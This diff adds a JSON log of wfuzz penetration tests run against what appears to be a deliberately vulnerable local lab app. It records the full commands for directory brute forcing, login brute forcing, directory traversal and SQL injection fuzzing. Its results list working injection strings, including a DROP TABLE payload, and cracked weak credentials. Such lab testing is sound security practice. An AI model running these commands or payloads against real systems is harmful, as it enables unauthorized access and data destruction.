@@ -1,0 +1,30 @@
+[
+  {
+    "timestamp": "2025-10-04T12:18:28.123501",
+    "test": "Directory Brute Force",
+    "description": "Attempting to discover hidden directories",
+    "command": "wfuzz -c -z file,dir_wordlist.txt --hc 404 http://localhost:5000/FUZZ",
+    "results": "Simulated: Found /admin (200), /login (200), /files (200)"
+  },
+  {
+    "timestamp": "2025-10-04T12:18:40.321624",
+    "test": "Parameter Fuzzing",
+    "description": "SQL injection testing on login form",
+    "command": "wfuzz -c -z file,sql_payloads.txt -d 'username=FUZZ&password=test' http://localhost:5000/vulnerable_login",
+    "results": "FAILED: ' OR '1'='1\nSUCCESS: ' OR 1=1-- - Got welcome message\nSUCCESS: admin'-- - Got welcome message\nFAILED: ' UNION SELECT 1,2,3--\nFAILED: '; DROP TABLE users;--"
+  },
+  {
+    "timestamp": "2025-10-04T12:19:23.196468",
+    "test": "Brute Force Login",
+    "description": "Testing weak password combinations",
+    "command": "wfuzz -c -z file,usernames.txt -z file,passwords.txt -d 'username=FUZZ&password=FUZ2Z' --ss 'Welcome' http://localhost:5000/vulnerable_login",
+    "results": "Successful logins: admin:admin123, test:test123"
+  },
+  {
+    "timestamp": "2025-10-04T12:19:35.450298",
+    "test": "File Inclusion",
+    "description": "Directory traversal testing",
+    "command": "wfuzz -c -z file,file_payloads.txt --sc 200 http://localhost:5000/files/FUZZ",
+    "results": "Accessible files: sensitive_config.txt"
+  }
+]
